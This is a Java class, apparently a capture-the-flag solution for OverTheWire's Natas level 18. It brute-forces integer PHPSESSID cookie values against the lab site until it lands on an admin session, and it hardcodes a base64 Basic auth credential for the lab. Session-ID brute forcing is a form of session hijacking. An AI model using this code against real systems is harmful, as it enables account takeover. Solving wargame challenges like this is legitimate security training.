package sessionHijacking;

import responseReader.HttpURLConnectionResponseReader;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.GZIPInputStream;

public class NatasIntegerCookieValueGuesser extends IntegerCookieValueGuesser {

    private static final String UNSUCCESSFUL_MESSAGE
            = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";

    public NatasIntegerCookieValueGuesser(int guessFrom, int guessTo) {
        super(guessFrom, guessTo, responseReader());
    }

    @Override
    protected boolean isGuessSuccessful(String response) {
        return !response.contains(UNSUCCESSFUL_MESSAGE);
    }

    @Override
    protected String getCookieTemplate() {
        return "PHPSESSID=%d";
    }

    @Override
    protected HttpURLConnection getHttpURLConnection(String cookie) throws Exception {
        URL url = new URL("http://natas18.natas.labs.overthewire.org/index.php");
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod("POST");
        urlConnection.setRequestProperty("Cache-Control", "max-age=0");
        urlConnection.setRequestProperty("Authorization", "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==");
        urlConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
        urlConnection.setRequestProperty("Origin", "http://natas18.natas.labs.overthewire.org");
        urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36");
        urlConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        urlConnection.setRequestProperty("Referer", "http://natas18.natas.labs.overthewire.org/");
        urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        urlConnection.setRequestProperty("Cookie", cookie);
        urlConnection.setDoOutput(true);
        return urlConnection;
    }

    private static HttpURLConnectionResponseReader responseReader() {
        return from -> {
            StringBuilder stringBuilder = new StringBuilder(1024);
            try (GZIPInputStream gzipInputStream = new GZIPInputStream(from.getInputStream());
                 InputStreamReader inputStreamReader = new InputStreamReader(gzipInputStream);
                 BufferedReader bufferedReader = new BufferedReader(inputStreamReader)) {
                bufferedReader.skip(807);
                while (true) {
                    int ch = bufferedReader.read();
                    if (ch == -1) {
                        break;
                    }
                    char next = (char) ch;

                    stringBuilder.append(next);
                }
            }
            String out = stringBuilder.toString();
            int indexAfterPre = out.indexOf("<pre>") + 5;
            int lastIndexOfPre = out.lastIndexOf("</pre>");
            if (indexAfterPre == 4 || lastIndexOfPre == -1) {
                return out;
            }
            return out.substring(indexAfterPre, lastIndexOfPre);
        };
    }
}
